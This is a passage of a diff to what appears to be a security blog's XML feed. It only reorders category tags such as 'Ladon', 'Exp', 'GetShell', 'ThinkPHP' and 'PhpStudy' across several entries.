+      <category term="Exp" scheme="http://k8gege.org/tags/Exp/"/>
+    
+      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
     
   </entry>
   
@@ -560,11 +560,11 @@
     
       <category term="Exp" scheme="http://k8gege.org/tags/Exp/"/>
     
+      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
+    
       <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
     
       <category term="GetShell" scheme="http://k8gege.org/tags/GetShell/"/>
-    
-      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
     
       <category term="ActiveMQ" scheme="http://k8gege.org/tags/ActiveMQ/"/>
     
@@ -601,11 +601,11 @@
     
       <category term="Exp" scheme="http://k8gege.org/tags/Exp/"/>
     
+      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
+    
       <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
     
       <category term="GetShell" scheme="http://k8gege.org/tags/GetShell/"/>
-    
-      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
     
       <category term="ThinkPHP" scheme="http://k8gege.org/tags/ThinkPHP/"/>
     
@@ -640,11 +640,11 @@
     
       <category term="Exp" scheme="http://k8gege.org/tags/Exp/"/>
     
+      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
+    
       <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
     
       <category term="GetShell" scheme="http://k8gege.org/tags/GetShell/"/>
-    
-      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
     
       <category term="PhpStudy" scheme="http://k8gege.org/tags/PhpStudy/"/>
     
@@ -679,11 +679,11 @@
     
       <category term="Exp" scheme="http://k8gege.org/tags/Exp/"/>
     
+      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
+    
       <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
     
       <category term="GetShell" scheme="http://k8gege.org/tags/GetShell/"/>
-    
-      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
     
       <category term="PhpStudy" scheme="http://k8gege.org/tags/PhpStudy/"/>
     
